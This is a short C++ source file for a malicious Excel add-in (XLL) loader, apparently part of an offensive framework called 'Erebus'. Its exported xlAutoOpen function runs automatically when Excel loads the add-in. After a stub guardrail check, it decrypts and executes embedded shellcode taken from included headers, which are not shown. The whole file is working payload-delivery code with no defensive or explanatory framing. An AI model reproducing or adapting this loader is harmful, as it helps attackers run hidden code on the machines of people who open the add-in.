#include <windows.h>

#include "xll_config.h"
#include "xll_shellcode.h"
#include "xll_inject.h"

#ifndef EREBUS_GUARDRAIL
static BOOL ErebusGuardrail(void) {
    return TRUE;
}
#endif

extern "C" __declspec(dllexport) int WINAPI xlAutoOpen(void) {
    if (!ErebusGuardrail()) {
        return 1;
    }

    DecryptShellcode();
    ExecuteShellcode(shellcode, shellcode_len);

    return 1;
}
